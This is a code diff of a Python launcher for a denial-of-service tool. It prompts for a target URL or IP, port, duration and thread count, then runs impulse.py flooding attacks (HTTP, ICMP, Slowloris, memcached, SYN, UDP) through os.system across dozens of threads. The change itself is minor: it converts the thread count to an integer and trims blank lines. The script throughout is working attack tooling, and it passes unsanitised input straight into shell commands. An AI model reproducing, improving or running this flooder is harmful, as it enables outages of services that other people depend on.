@@ -80,46 +80,41 @@ helpmenu = """
   SYN: URL/IPV4, PORT 80/443/53 (Recommend 53)
   UDP: URL/IPV4, PORT 80/443/53 (Recommend 53)
 """
-
 print(Fore.RED + logo + Fore.BLUE)
-
 print(Fore.MAGENTA+helpmenu+Fore.WHITE)
 
 ip = input(Fore.CYAN+"  URL/IP: "+Fore.WHITE)
-
 threadcount = float(input(Fore.CYAN+"  How many threads (1-300): "+Fore.WHITE))
-
 count = float(input(Fore.CYAN+"  Multiplier(1-50): "+Fore.WHITE))
-
 length = input(Fore.CYAN+"  How long to hit (Seconds): "+Fore.WHITE)
-
 port = input(Fore.CYAN+"  Port: ")
-
 hitmethod = input(Fore.CYAN+"  Method: "+Fore.WHITE)
+
+threadcounted = int(threadcount)
 
 def http():
   print(Fore.GREEN+"  Started Thread!")
-  os.system("python3.9 impulse.py --target "+ip+":"+port+ " --time "+ length+" --threads "+str(threadcount)+" --method HTTP")
+  os.system("python3.9 impulse.py --target "+ip+":"+port+ " --time "+ length+" --threads "+str(threadcounted)+" --method HTTP")
   print(Fore.GREEN + "  Started "+threading.current_thread().name +"!")
 def icmp():
   print(Fore.GREEN+"  Started Thread!")
-  os.system("python3.9 impulse.py --target "+ip+":"+port+" --time "+length+" --threads "+str(threadcount)+" --method ICMP")
+  os.system("python3.9 impulse.py --target "+ip+":"+port+" --time "+length+" --threads "+str(threadcounted)+" --method ICMP")
   print(Fore.GREEN + "  Started "+threading.current_thread().name +"!")
 def slowloris():
   print(Fore.GREEN+"  Started Thread!")
-  os.system("python3.9 impulse.py --target "+ip+":"+port+" --time "+length+" --threads "+str(threadcount)+" --method SLOWLORIS")
+  os.system("python3.9 impulse.py --target "+ip+":"+port+" --time "+length+" --threads "+str(threadcounted)+" --method SLOWLORIS")
   print(Fore.GREEN + "  Started "+threading.current_thread().name +"!")
 def memcached():
   print(Fore.GREEN+"  Started Thread!")
-  os.system("python3.9 impulse.py --target "+ip+":"+port+" --time "+length+" --threads "+str(threadcount)+" --method MEMCACHED")
+  os.system("python3.9 impulse.py --target "+ip+":"+port+" --time "+length+" --threads "+str(threadcounted)+" --method MEMCACHED")
   print(Fore.GREEN + "  Started "+threading.current_thread().name +"!")
 def syn():
   print(Fore.GREEN+"  Started Thread!")
-  os.system("python3.9 impulse.py --target "+ip+":"+port+" --time "+length+" --threads "+str(threadcount)+" --method SYN")
+  os.system("python3.9 impulse.py --target "+ip+":"+port+" --time "+length+" --threads "+str(threadcounted)+" --method SYN")
   print(Fore.GREEN + "  Started "+threading.current_thread().name +"!")
 def udp():
   print(Fore.GREEN+"  Started Thread!")
-  os.system("python3.9 impulse.py --target "+ip+":"+port+" --time "+length+" --threads "+str(threadcount)+" --method UDP")
+  os.system("python3.9 impulse.py --target "+ip+":"+port+" --time "+length+" --threads "+str(threadcounted)+" --method UDP")
   print(Fore.GREEN + "  Started "+threading.current_thread().name +"!")
 
 counted = count * threadcount
@@ -131,13 +126,11 @@ if yesno == "n":
   time.sleep(2)
   os.system("clear")
   exit()
-
 if yesno == "N":
   print(Fore.BLUE+"  Exiting...")
   time.sleep(2)
   os.system("clear")
   exit()
-
 if hitmethod == "HTTP":
   t1 = threading.Thread(target=http)
   t2 = threading.Thread(target=http)
@@ -750,7 +743,6 @@ if hitmethod == "udp":
   t48 = threading.Thread(target=udp)
   t49 = threading.Thread(target=udp)
   t50 = threading.Thread(target=udp)
-
 if float(count) == 1:
   t1.start()
 if float(count) == 2:
